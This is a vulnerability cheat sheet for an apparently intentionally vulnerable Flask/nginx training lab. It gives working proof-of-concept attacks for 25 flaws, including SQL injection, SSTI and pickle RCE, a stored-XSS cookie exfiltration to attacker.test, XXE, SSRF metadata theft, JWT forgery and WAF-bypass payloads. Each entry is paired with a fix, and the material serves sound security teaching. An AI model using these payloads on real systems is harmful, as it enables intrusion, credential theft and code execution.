# Vulnerability Cheat Sheet

Target base URL in these examples: `http://localhost:8080` (through nginx,
`WAF_MODE=off` unless noted). Replace with `http://localhost:8080` throughout.

---

### VULN-01 — Hardcoded secret key (CWE-798)
**Where:** `web/app.py`, `app.secret_key` / `JWT_SECRET`
**Impact:** Anyone with source access (or who guesses/leaks it) can forge
session cookies and JWTs.
**PoC:** Use `s3cr3t_dev_key_2023` to forge a Flask session cookie with
`flask-unsign`:
```bash
pip install flask-unsign
flask-unsign --sign --cookie "{'uid':2,'user':'admin','is_admin':True}" --secret 's3cr3t_dev_key_2023'
```
Set the output as your `session` cookie -> instant admin session.
**Fix:** Generate a random secret per environment, load from a secrets
manager/env var, rotate on leak.

---

### VULN-02 — Debug mode enabled in production (CWE-489)
**Where:** `app.config["DEBUG"] = True`
**Impact:** Any unhandled exception shows the Werkzeug interactive debugger
with full stack trace, source, and (if the debugger PIN is bypassed/absent)
an in-browser Python console = RCE.
**PoC:** Trigger an error, e.g. `GET /search?q=' ` (unbalanced quote) and
observe the traceback / debugger page.
**Fix:** `debug=False` in any non-local environment; never ship debug mode.

---

### VULN-03 — Weak password hashing: unsalted MD5 (CWE-759/CWE-327)
**Where:** `md5()` helper, used for all user passwords.
**Impact:** Rainbow-table/GPU cracking is trivial; no per-user salt.
**PoC:**
```bash
echo -n "password123" | md5sum   # matches alice's stored hash
```
**Fix:** `bcrypt`/`argon2id` with per-user salt and adequate work factor.

---

### VULN-04 — Overly permissive CORS (CWE-942)
**Where:** `add_headers()`, `/api/*` -> `Access-Control-Allow-Origin: *`
**and** `Access-Control-Allow-Credentials: true` together (invalid/unsafe
combo some browsers still partially honor; demonstrates the misconfig).
**Impact:** Any origin can read API responses for an authenticated user.
**PoC:** From a page on a different origin:
```js
fetch('http://localhost:8080/api/user/2', {credentials:'include'})
  .then(r=>r.json()).then(console.log)
```
**Fix:** Explicit origin allow-list; never combine `*` with credentials.

---

### VULN-05 — Information disclosure (CWE-209/CWE-200)
**Where:** SQL error messages returned verbatim (`/login`, `/search`), plus
`X-Powered-By` header.
**PoC:**
```bash
curl "http://localhost:8080/search?q='"
```
Returns the raw SQL and driver error, confirming SQLi and schema hints.
**Fix:** Generic error pages to users; log details server-side only.

---

### VULN-06 — SQL Injection, authentication bypass (CWE-89) — **A03:2021**
**Where:** `/login` (string-concatenated query)
**PoC:**
```bash
curl -i -X POST http://localhost:8080/login \
  -d "username=admin' -- " -d "password=anything"
```
Or via the form: username `admin' -- `, any password -> logs in as admin
without knowing the password.
**Fix:** Parameterized queries (`?` placeholders) everywhere; never
f-string/concat user input into SQL.

---

### VULN-07 — No rate limiting on login (CWE-307) — **A07:2021**
**Where:** `/login`
**PoC:** Scripted brute force:
```bash
for p in $(cat rockyou-sample.txt); do
  curl -s -o /dev/null -w "%{http_code} $p\n" \
    -X POST http://localhost:8080/login -d "username=alice&password=$p"
done
```
**Fix:** Account lockout / exponential backoff / CAPTCHA after N failures,
IP-based rate limiting at the nginx layer (`limit_req_zone`).

---

### VULN-08 — Reflected XSS (CWE-79) — **A03:2021**
**Where:** `/search?q=`
**PoC:**
```
http://localhost:8080/search?q=<script>alert(document.cookie)</script>
```
**Fix:** Auto-escape output (Jinja2 autoescaping; don't hand-build HTML
strings), set `Content-Security-Policy`.

---

### VULN-09 — SQL Injection (UNION-based) via search (CWE-89)
**Where:** `/search?q=`
**PoC — enumerate tables then dump the admin's secret note:**
```
http://localhost:8080/search?q=%' UNION SELECT 1,username,secret_note,4 FROM users --
```
(Adjust column count to match `comments` schema — try `NULL,NULL,NULL`
first to find the right width, classic UNION-based SQLi methodology.)
**Fix:** Same as VULN-06 — parameterized queries.

---

### VULN-10 — Stored XSS (CWE-79) — **A03:2021**
**Where:** `/comments` (POST `body`, rendered with `|safe`)
**PoC:**
```bash
curl -X POST http://localhost:8080/comments \
  -d "author=atk" -d "body=<script>fetch('//attacker.test/c?c='+document.cookie)</script>"
```
Every visitor to `/comments` now exfiltrates their cookie.
**Fix:** Never use `|safe` on user input; sanitize/escape on output
(or sanitize with an allow-list like `bleach` if HTML must be preserved).

---

### VULN-11 — Server-Side Template Injection (CWE-1336) — **A03:2021**
**Where:** `/greet?name=`
**PoC — read environment, then RCE:**
```
http://localhost:8080/greet?name={{7*7}}          -> confirms SSTI (49)
http://localhost:8080/greet?name={{config.items()}}
http://localhost:8080/greet?name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
**Fix:** Never build template strings from user input; use
`render_template()` with a fixed template and pass data as context
variables (auto-escaped), not `render_template_string(user_input)`.

---

### VULN-12 — Insecure deserialization (CWE-502) — **A08:2021**
**Where:** `/profile/import` (`pickle.loads` on user-supplied base64)
**PoC — RCE via malicious pickle:**
```python
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned; cat /tmp/pwned",))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```
```bash
curl -X POST http://localhost:8080/profile/import -d "data=<payload>"
```
**Fix:** Never unpickle untrusted data. Use JSON + schema validation
instead.

---

### VULN-13 — OS command injection (CWE-78) — **A03:2021**
**Where:** `/ping?host=`
**PoC:**
```
http://localhost:8080/ping?host=127.0.0.1;cat%20/etc/passwd
http://localhost:8080/ping?host=127.0.0.1%20%26%26%20id
```
**Fix:** Avoid `shell=True`; use `subprocess.run([...], shell=False)` with
an argument list, validate `host` against a strict format (IP/hostname
regex).

---

### VULN-14 — Path traversal / LFI (CWE-22) — **A01:2021**
**Where:** `/download?file=`
**PoC:**
```
http://localhost:8080/download?file=../../../../etc/passwd
http://localhost:8080/download?file=../app.py   # leak source code
```
**Fix:** Resolve the path and verify it's still inside the allowed base
directory (`os.path.realpath` + prefix check), or use an opaque file-id
lookup table instead of raw filenames.

---

### VULN-15 — IDOR / Broken Object-Level Authorization (CWE-639) — **A01:2021**
**Where:** `/api/user/<id>`
**PoC:**
```bash
curl http://localhost:8080/api/user/2
```
Returns the admin's record (including `secret_note` containing a flag)
with zero authentication/ownership check.
**Fix:** Verify `session['uid'] == uid` (or an explicit role check) before
returning the record.

---

### VULN-16 — Mass assignment (CWE-915) — **A08:2021**
**Where:** `/api/user/update` (merges raw client JSON into the user row)
**PoC (after logging in as alice to get a session cookie):**
```bash
curl -X POST http://localhost:8080/api/user/update \
  -H "Content-Type: application/json" -b "session=<alice_cookie>" \
  -d '{"email":"alice@lab.local","is_admin":true}'
```
Alice is now an admin.
**Fix:** Explicit allow-list of updatable fields; never `dict.update()`
a model with raw request JSON.

---

### VULN-17 — CSRF (CWE-352) — **A01:2021**
**Where:** `/api/change-email` (cookie-auth, no CSRF token, state-changing)
**PoC — host this HTML anywhere and get a logged-in victim to open it:**
```html
<form action="http://localhost:8080/api/change-email" method="POST">
  <input name="email" value="attacker@evil.test">
</form>
<script>document.forms[0].submit()</script>
```
**Fix:** CSRF tokens (`flask-wtf` / `itsdangerous`-signed token checked on
each state-changing request), `SameSite=Lax/Strict` cookies, verify
`Origin`/`Referer`.

---

### VULN-18 — JWT "alg=none" / algorithm confusion (CWE-347) — **A02:2021**
**Where:** `/api/admin` trusts the client-supplied `alg` header.
**PoC — forge an admin token with no signature:**
```python
import base64, json
def b64u(d): return base64.urlsafe_b64encode(d).rstrip(b'=')
header  = b64u(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64u(json.dumps({"user":"attacker","is_admin":True}).encode())
token = header + b"." + payload + b"."
print(token.decode())
```
```bash
curl http://localhost:8080/api/admin -H "Authorization: Bearer <token>"
```
Returns the admin flag with no valid signature at all.
**Fix:** Pin the expected algorithm server-side (`jwt.decode(token, key,
algorithms=["HS256"])` only — never derive `alg` from the token itself);
reject `none` explicitly.

---

### VULN-19 — Unrestricted file upload (CWE-434) — **A04:2021**
**Where:** `/upload` (no extension allow-list, no filename sanitization)
**PoC — stored XSS via SVG, served from your own origin:**
```bash
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>' > x.svg
curl -F "file=@x.svg" http://localhost:8080/upload
# then open /static/uploads/x.svg
```
**Path traversal in filename (overwrite app files)** — demonstrate with a
tool that lets you set a custom multipart filename of `../app.py`.
**Fix:** Allow-list extensions + MIME sniffing, randomize stored filenames
(never trust client-supplied names), serve uploads from a separate
no-script origin/bucket, disable execution in the upload directory.

---

### VULN-20 — XXE (CWE-611) — **A05:2021**
**Where:** `POST /api/xml` (`resolve_entities=True`)
**PoC:**
```bash
curl -X POST http://localhost:8080/api/xml \
  -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>'
```
**Fix:** Disable DTDs/external entities (`resolve_entities=False`,
`no_network=True`, or use `defusedxml`).

---

### VULN-21 — SSRF, including cloud-metadata theft (CWE-918) — **A10:2021**
**Where:** `/fetch?url=`
**PoC — steal the fake instance credentials from the internal `metadata`
service (not reachable directly from your host, only via the app):**
```
http://localhost:8080/fetch?url=http://metadata/latest/meta-data/iam/security-credentials/lab-role
```
Also try `http://metadata/latest/meta-data/iam/security-credentials/` to
enumerate the role name first, and `file:///etc/passwd` if `requests`'
scheme handling allows it in your environment.
**Fix:** Allow-list destination hosts/schemes, block link-local/metadata
ranges (169.254.0.0/16) at the egress layer, use a forward proxy with
strict policy for any server-side fetch feature.

---

### VULN-22 — Open redirect (CWE-601)
**Where:** `/redirect?next=`
**PoC:**
```
http://localhost:8080/redirect?next=https://evil.example.com/phish
```
Useful for phishing (trusted-domain prefix) and as an OAuth
`redirect_uri` bypass building block.
**Fix:** Only allow relative paths or an explicit allow-list of domains.

---

### VULN-23 — Race condition / TOCTOU (CWE-362) — **A04:2021**
**Where:** `/api/redeem` (check-then-update with no transaction/locking,
and an artificial 300ms sleep to make the window easy to hit)
**PoC — redeem a single-use coupon many times concurrently:**
```bash
for i in $(seq 1 20); do
  curl -s -X POST http://localhost:8080/api/redeem -d "code=LAB10" &
done; wait
```
Multiple requests see `uses_left > 0` before any of them decrements it.
**Fix:** Atomic `UPDATE coupons SET uses_left = uses_left - 1 WHERE code=?
AND uses_left > 0` and check `rowcount`, or use a DB transaction with
row-level locking.

---

### VULN-24 — Web cache poisoning (CWE-444) — **nginx + app combo**
**Where:** nginx `location /welcome` caches by URL only; the Flask app
reflects `X-Forwarded-Host` into the page.
**PoC:**
```bash
curl -s http://localhost:8080/welcome \
  -H "X-Forwarded-Host: evil.attacker.test" | grep reset
# then, as a different "victim" request with no special header:
curl -s http://localhost:8080/welcome | grep reset
```
The second request — from a totally different client — now gets the
poisoned `evil.attacker.test` link because nginx served it from cache.
**Fix:** Include all headers that influence the response in the cache
key (or don't cache personalized/header-dependent responses at all);
never trust `X-Forwarded-Host` for building links — use a configured
canonical hostname.

---

### VULN-25 — Debug endpoint leaking secrets (CWE-215)
**Where:** `/debug`
**PoC:**
```bash
curl http://localhost:8080/debug
```
Dumps the Flask secret key, JWT secret, and full environment variables.
**Fix:** Remove debug/diagnostic endpoints before shipping; if needed,
gate behind strong auth + network restriction.

---

## WAF Bypass (set `WAF_MODE=on` in docker-compose.yml first)

The nginx WAF blocks literal, lowercase-ish patterns. It's intentionally
naive so you can practice real-world bypass technique:

| Blocked pattern | Bypass idea | Example |
|---|---|---|
| `union select` | inline comments / case | `UNI/**/ON SEL/**/ECT` or `uNiOn SeLeCt` |
| `<script` | alternate tags/events | `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>` |
| `../` | double/URL encoding | `%2e%2e%2f`, `..%252f`, `....//` |
| `/etc/passwd` | obscure paths | `/etc/./passwd`, `/etc//passwd`, PHP wrapper-style tricks |
| User-Agent `sqlmap` | spoof UA | `--user-agent "Mozilla/5.0"` in sqlmap/curl |

**PoC with WAF on:**
```bash
curl "http://localhost:8080/search?q=%25' UNI/**/ON SEL/**/ECT 1,username,password,4 FROM users --"
```
This is also a good exercise in why **regex/signature WAFs are not a
substitute for fixing the underlying vulnerability** — the SQLi is still
there; only the naive detection was defeated.

---

## Summary table

| ID | Vuln | OWASP | Endpoint |
|----|------|-------|----------|
| 01 | Hardcoded secret | A02 | global |
| 02 | Debug mode on | A05 | global |
| 03 | Weak hashing (MD5) | A02 | login/db |
| 04 | Permissive CORS | A05 | /api/* |
| 05 | Info disclosure (errors) | A05 | /login, /search |
| 06 | SQLi auth bypass | A03 | /login |
| 07 | No rate limiting | A07 | /login |
| 08 | Reflected XSS | A03 | /search |
| 09 | SQLi (UNION) | A03 | /search |
| 10 | Stored XSS | A03 | /comments |
| 11 | SSTI | A03 | /greet |
| 12 | Insecure deserialization | A08 | /profile/import |
| 13 | Command injection | A03 | /ping |
| 14 | Path traversal / LFI | A01 | /download |
| 15 | IDOR | A01 | /api/user/<id> |
| 16 | Mass assignment | A08 | /api/user/update |
| 17 | CSRF | A01 | /api/change-email |
| 18 | JWT alg=none | A02 | /api/admin |
| 19 | Unrestricted upload | A04 | /upload |
| 20 | XXE | A05 | /api/xml |
| 21 | SSRF (metadata) | A10 | /fetch |
| 22 | Open redirect | - | /redirect |
| 23 | Race condition | A04 | /api/redeem |
| 24 | Cache poisoning | - | /welcome (nginx) |
| 25 | Debug info leak | A05 | /debug |
| - | Naive WAF (bypassable) | - | nginx layer, toggle `WAF_MODE` |
